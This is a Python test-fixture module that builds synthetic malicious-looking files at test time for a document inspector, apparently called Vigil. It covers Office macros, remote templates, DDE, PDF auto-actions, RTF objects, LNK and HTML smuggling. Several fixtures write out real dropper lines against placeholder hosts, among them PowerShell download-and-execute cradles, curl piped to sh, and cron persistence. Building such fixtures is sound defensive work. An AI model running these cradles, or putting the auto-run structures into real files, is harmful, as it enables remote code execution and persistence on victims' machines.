"""Builders for SYNTHETIC suspicious-looking files, made at test time.

These reproduce the *structure* of malicious documents (auto-run macros, remote
templates, PDF auto-actions, disguised executables) with harmless content. They are
generated rather than committed so that antivirus on a developer's machine has no
reason to quarantine the repository. Nothing here is, or contains, real malware.
"""

import io
import struct
import zipfile
import zlib

ENDOFCHAIN, FREESECT, FATSECT, NOSTREAM = 0xFFFFFFFE, 0xFFFFFFFF, 0xFFFFFFFD, 0xFFFFFFFF
FAKE_PE = (b"MZ" + b"\0" * 58 + struct.pack("<I", 0x40) + b"PE\0\0" + b"\0" * 20
           + b"This program cannot be run in DOS mode.\r\n" + b"\0" * 64)


# ---- MS-OVBA compression and MS-CFB (OLE2) writing --------------------------------

def ovba_compress(data):
    """Greedy MS-OVBA compressor with copy tokens (independent of vigil's decoder)."""
    out = bytearray(b"\x01")
    for start in range(0, len(data), 4096):
        chunk = data[start:start + 4096]
        body, pos = bytearray(), 0
        while pos < len(chunk):
            flag_at = len(body)
            body.append(0)
            for bit in range(8):
                if pos >= len(chunk):
                    break
                best_len = best_off = 0
                if pos:
                    bits = max((pos - 1).bit_length(), 4)
                    max_len = min((0xFFFF >> bits) + 3, len(chunk) - pos)
                    for off in range(1, min(pos, 1 << bits) + 1):
                        n = 0
                        while n < max_len and chunk[pos - off + n] == chunk[pos + n]:
                            n += 1
                        if n > best_len:
                            best_len, best_off = n, off
                if best_len >= 3:
                    bits = max((pos - 1).bit_length(), 4)
                    body += struct.pack("<H", ((best_off - 1) << (16 - bits)) | (best_len - 3))
                    body[flag_at] |= 1 << bit
                    pos += best_len
                else:
                    body.append(chunk[pos])
                    pos += 1
        if len(body) > 4096:  # incompressible: store the chunk raw
            out += struct.pack("<H", 0x3FFF) + chunk.ljust(4096, b"\0")
        else:
            out += struct.pack("<H", 0xB000 | (len(body) + 2 - 3)) + body
    return bytes(out)


def build_ole(streams):
    """A version-3 compound file holding {path tuple: bytes}."""
    entries = [{"name": "Root Entry", "type": 5, "kids": []}]
    index = {(): 0}
    for path in sorted(streams):
        for i in range(1, len(path)):
            if path[:i] not in index:
                index[path[:i]] = len(entries)
                entries.append({"name": path[i - 1], "type": 1, "kids": []})
                entries[index[path[:i - 1]]]["kids"].append(index[path[:i]])
        index[path] = len(entries)
        entries.append({"name": path[-1], "type": 2, "data": streams[path], "kids": []})
        entries[index[path[:-1]]]["kids"].append(index[path])

    sectors, fat = [], []

    def alloc(blob):
        n = max(1, -(-len(blob) // 512))
        first = len(sectors)
        for i in range(n):
            sectors.append(blob[i * 512:(i + 1) * 512].ljust(512, b"\0"))
            fat.append(first + i + 1 if i < n - 1 else ENDOFCHAIN)
        return first

    mini, minifat = bytearray(), []
    for e in entries:
        if e["type"] == 2 and len(e["data"]) < 4096:
            n = -(-len(e["data"]) // 64)
            e["start"] = len(mini) // 64 if n else ENDOFCHAIN
            minifat += [e["start"] + i + 1 for i in range(n - 1)] + ([ENDOFCHAIN] if n else [])
            mini += e["data"].ljust(n * 64, b"\0")
        elif e["type"] == 2:
            e["start"] = alloc(e["data"])
    entries[0]["start"] = alloc(bytes(mini)) if mini else ENDOFCHAIN
    entries[0]["data"] = mini

    raw = bytearray()
    for e in entries:
        kids = e["kids"]
        e["child"] = kids[0] if kids else NOSTREAM
        for a, b in zip(kids, kids[1:]):
            entries[a]["right"] = b
    for e in entries:
        name = (e["name"] + "\0").encode("utf-16-le")
        raw += name.ljust(64, b"\0") + struct.pack("<HBB", len(name), e["type"], 1)
        raw += struct.pack("<III", NOSTREAM, e.get("right", NOSTREAM), e["child"])
        raw += b"\0" * 16 + struct.pack("<I", 0) + b"\0" * 16
        raw += struct.pack("<IQ", e.get("start", 0), len(e.get("data", b"")))
    while len(raw) % 512:
        raw += b"\0" * 64 + struct.pack("<HBB", 0, 0, 0) + struct.pack("<III", NOSTREAM, NOSTREAM,
                                                                        NOSTREAM) + b"\0" * 52
    dir_start = alloc(bytes(raw))
    mf = struct.pack(f"<{len(minifat)}I", *minifat) if minifat else b""
    minifat_start = alloc(mf.ljust(-(-len(mf) // 512) * 512, b"\xff")) if mf else ENDOFCHAIN
    n_minifat = -(-len(mf) // 512)

    n_fat = 1
    while len(sectors) + n_fat > n_fat * 128:
        n_fat += 1
    fat_first = len(sectors)
    fat += [FATSECT] * n_fat
    fat += [FREESECT] * (n_fat * 128 - len(fat))
    fat_bytes = struct.pack(f"<{len(fat)}I", *fat)
    for i in range(n_fat):
        sectors.append(fat_bytes[i * 512:(i + 1) * 512])

    difat = [fat_first + i for i in range(n_fat)] + [FREESECT] * (109 - n_fat)
    header = (b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 16
              + struct.pack("<HHHHH", 0x3E, 3, 0xFFFE, 9, 6) + b"\0" * 6
              + struct.pack("<IIIIIIIII", 0, n_fat, dir_start, 0, 4096, minifat_start, n_minifat,
                            ENDOFCHAIN, 0)
              + struct.pack("<109I", *difat))
    return header + b"".join(sectors)


def vba_project(modules, junk=b"\xcc\x61" * 40):
    """Streams of a VBA project: {'dir', '_VBA_PROJECT', module streams}.

    Each module stream starts with `junk` (standing in for the p-code cache) so the
    text offset from the dir stream is exercised.
    """
    rec = lambda rid, data: struct.pack("<HI", rid, len(data)) + data
    d = bytearray()
    d += rec(0x0001, struct.pack("<I", 1)) + rec(0x0002, struct.pack("<I", 0x409))
    d += rec(0x0014, struct.pack("<I", 0x409)) + rec(0x0003, struct.pack("<H", 1252))
    d += rec(0x0004, b"VBAProject") + rec(0x0005, b"") + rec(0x0040, b"")
    d += rec(0x0006, b"") + rec(0x003D, b"") + rec(0x0007, b"\0" * 4) + rec(0x0008, b"\0" * 4)
    d += struct.pack("<HIIH", 0x0009, 4, 1, 1)  # PROJECTVERSION: size says 4, 6 bytes follow
    d += rec(0x000C, b"") + rec(0x003C, b"")
    d += rec(0x000F, struct.pack("<H", len(modules))) + rec(0x0013, b"\xff\xff")
    streams = {}
    for name, source in modules.items():
        stream = name.encode()
        d += rec(0x0019, stream) + rec(0x0047, name.encode("utf-16-le"))
        d += rec(0x001A, stream) + rec(0x0032, name.encode("utf-16-le"))
        d += rec(0x001C, b"") + rec(0x0048, b"") + rec(0x0031, struct.pack("<I", len(junk)))
        d += rec(0x001E, b"\0" * 4) + rec(0x002C, b"\xff\xff") + rec(0x0021, b"")
        d += struct.pack("<HI", 0x002B, 0)
        streams[name] = junk + ovba_compress(source.encode("cp1252"))
    d += struct.pack("<HI", 0x0010, 0)
    streams["dir"] = ovba_compress(bytes(d))
    streams["_VBA_PROJECT"] = b"\xcc\x61\xff\xff\x00\x00\x00"
    return streams


DROPPER_VBA = '''Attribute VB_Name = "ThisDocument"
Sub AutoOpen()
    ' SYNTHETIC test macro: the structure of a dropper, with nothing real to fetch.
    Dim cmd As String
    cmd = "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.20/stage2.ps1')"
    CreateObject("WScript.Shell").Run cmd, 0
End Sub
'''

BENIGN_VBA = '''Attribute VB_Name = "Module1"
Sub FormatTable()
    ' SYNTHETIC test macro that only formats a table when run by hand.
    Selection.Font.Bold = True
End Sub
'''


def vba_bin(modules):
    return build_ole({("VBA", k): v for k, v in vba_project(modules).items()}
                     | {("PROJECT",): b'ID="{00000000-0000-0000-0000-000000000000}"\r\n'})


# ---- Office documents ----------------------------------------------------------------

CT_MACRO = "application/vnd.ms-word.document.macroEnabled.main+xml"
CT_DOCX = "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"


def ooxml(parts):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in parts.items():
            z.writestr(name, data)
    return buf.getvalue()


def word_parts(content_type=CT_DOCX, body="Synthetic test document.", extra_rels=""):
    return {
        "[Content_Types].xml": f'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="{content_type}"/></Types>',
        "_rels/.rels": '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>',
        "word/document.xml": f'<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>{body}</w:t></w:r></w:p></w:body></w:document>',
        "word/_rels/document.xml.rels": f'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">{extra_rels}</Relationships>',
    }


def docm_dropper():
    parts = word_parts(CT_MACRO)
    parts["word/vbaProject.bin"] = vba_bin({"ThisDocument": DROPPER_VBA})
    return ooxml(parts)


def docx_with_benign_macro():
    parts = word_parts()
    parts["word/vbaProject.bin"] = vba_bin({"Module1": BENIGN_VBA})
    return ooxml(parts)


def docx_remote_template():
    parts = word_parts()
    parts["word/_rels/settings.xml.rels"] = (
        '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"'
        ' Target="https://198.51.100.88/templates/invoice.dotm" TargetMode="External"/></Relationships>')
    return ooxml(parts)


def docx_follina():
    rel = ('<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"'
           ' Target="mhtml:http://198.51.100.89/payload.html!x-usc:http://198.51.100.89/payload.html" TargetMode="External"/>')
    return ooxml(word_parts(extra_rels=rel))


def docx_dde():
    parts = word_parts()
    parts["word/document.xml"] = (
        '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        '<w:body><w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k echo synthetic" </w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p></w:body></w:document>')
    return ooxml(parts)


def xlsm_xlm():
    return ooxml({
        "[Content_Types].xml": '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>',
        "xl/workbook.xml": '<?xml version="1.0"?><workbook><definedNames><definedName name="_xlnm.Auto_Open">Macro1!$A$1</definedName></definedNames></workbook>',
        "xl/macrosheets/sheet1.xml": '<?xml version="1.0"?><xm:macrosheet><c><f>EXEC("calc.exe")</f></c></xm:macrosheet>',
    })


def doc_legacy_macro():
    streams = {("WordDocument",): b"\xec\xa5" + b"\0" * 1024, ("1Table",): b"\0" * 512}
    streams |= {("Macros", "VBA", k): v for k, v in vba_project({"ThisDocument": DROPPER_VBA}).items()}
    streams[("Macros", "PROJECT")] = b'ID="{00000000-0000-0000-0000-000000000000}"\r\n'
    return build_ole(streams)


def xls_hidden_xlm():
    """BIFF8 workbook: a visible sheet, a very hidden macro sheet and an Auto_Open name."""
    rec = lambda t, d: struct.pack("<HH", t, len(d)) + d
    sheet = lambda name, state, dt: rec(0x0085, struct.pack("<IBBBB", 0, state, dt, len(name), 0)
                                        + name.encode())
    name_rec = struct.pack("<HBBHHHBBBB", 0x20, 0, 1, 0, 0, 0, 0, 0, 0, 0) + b"\x00\x01"
    wb = (rec(0x0809, struct.pack("<HHHHII", 0x600, 5, 0, 0, 0, 0)) + sheet("Sheet1", 0, 0)
          + sheet("Macro1", 2, 1) + rec(0x0018, name_rec) + rec(0x000A, b""))
    return build_ole({("Workbook",): wb.ljust(4096, b"\0")})


# ---- PDF -----------------------------------------------------------------------------

def pdf(objects, catalog_extra=""):
    body = [b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"]
    body.append(f"1 0 obj << /Type /Catalog /Pages 2 0 R {catalog_extra} >> endobj\n".encode())
    body.append(b"2 0 obj << /Type /Pages /Kids [] /Count 0 >> endobj\n")
    body += objects
    body.append(b"trailer << /Root 1 0 R >>\n%%EOF\n")
    return b"".join(body)


def pdf_autorun_js():
    return pdf([b"3 0 obj << /S /JavaScript /JS (app.alert\\(\"synthetic\"\\); "
                b"this.submitForm\\('http://198.51.100.90/collect'\\);) >> endobj\n"],
               "/OpenAction 3 0 R")


def pdf_obfuscated():
    return pdf([b"3 0 obj << /S /J#61vaScript /J#53 (app.alert\\(1\\)) >> endobj\n"],
               "/Open#41ction 3 0 R")


def pdf_hidden_in_objstm():
    inner = zlib.compress(b"4 0 << /S /JavaScript /JS (app.alert\\(\"hidden\"\\)) >>")
    return pdf([b"3 0 obj << /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /Length "
                + str(len(inner)).encode() + b" >>\nstream\n" + inner + b"\nendstream\nendobj\n"],
               "/OpenAction 4 0 R")


def pdf_launch_embedded():
    return pdf([b"3 0 obj << /S /Launch /F (cmd.exe) >> endobj\n",
                b"4 0 obj << /Type /Filespec /F (invoice.pdf.exe) /EF << /F 5 0 R >> >> endobj\n",
                b"5 0 obj << /Type /EmbeddedFile >> endobj\n"],
               "/Names << /EmbeddedFiles << /Names [(x) 4 0 R] >> >> /OpenAction 3 0 R")


def pdf_with_appended_exe():
    return pdf([]) + FAKE_PE


# ---- other formats ---------------------------------------------------------------------

def rtf_equation():
    obj = (b"0105000002000000" + b"Equation.3".hex().encode() + FAKE_PE.hex().encode())
    return (b"{\\rtf1\\ansi{\\object\\objemb\\objupdate{\\*\\objclass Equation.3}"
            b"{\\*\\objdata " + obj + b"}}}")


def rtf_malformed_header():
    return b"{\\rt{\\object\\objlink{\\*\\objclass OLE2Link}{\\*\\objdata 0105}}}"


def zip_delivery():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("invoice_2026.pdf.exe", FAKE_PE)
        z.writestr("readme.txt", "Synthetic archive for Vigil tests.\n")
        z.writestr("secret/locked.docm", b"synthetic")
    return mark_encrypted(buf.getvalue(), b"secret/locked.docm")


def mark_encrypted(data, name):
    """Set the 'encrypted' flag of one member in its local and central headers.

    zipfile clears flag bits when writing, so this patches the bytes afterwards.
    The member's content stays plain; only the flag matters to the inspector.
    """
    data = bytearray(data)
    for sig, flag_at, name_len_at, name_at in ((b"PK\x03\x04", 6, 26, 30), (b"PK\x01\x02", 8, 28, 46)):
        pos = data.find(sig)
        while pos >= 0:
            n = struct.unpack_from("<H", data, pos + name_len_at)[0]
            if bytes(data[pos + name_at:pos + name_at + n]) == name:
                struct.pack_into("<H", data, pos + flag_at, struct.unpack_from("<H", data, pos + flag_at)[0] | 1)
            pos = data.find(sig, pos + 4)
    return bytes(data)


SHELL_DROPPER = b"""#!/bin/sh
# SYNTHETIC test script: the shape of a Linux dropper; addresses are documentation ranges.
curl -fsSL http://198.51.100.20/install.sh | sh
wget -q -O /tmp/.x/agent http://198.51.100.20/agent && chmod +x /tmp/.x/agent
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.x/agent") | crontab -
"""

PS1_CRADLE = (b"# SYNTHETIC\r\npowershell.exe -nop -w hidden -enc SQBFAFgA\r\n"
              b"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.20/a.ps1')\r\n")


def lnk_powershell():
    header = b"L\x00\x00\x00\x01\x14\x02\x00" + b"\0" * 68
    args = "-w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.20/s')\""
    target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    return header + target.encode("utf-16-le") + b"\0\0" + args.encode("utf-16-le") + b"\0\0"


def html_smuggling():
    blob = ("TVqQAAMAAAAEAAAA" * 200).encode()
    return (b"<!doctype html><html><body><script>var d='" + blob + b"';"
            b"var b=new Blob([atob(d)]);var a=document.createElement('a');"
            b"a.href=URL.createObjectURL(b);a.download='invoice.iso';a.click();</script></body></html>")
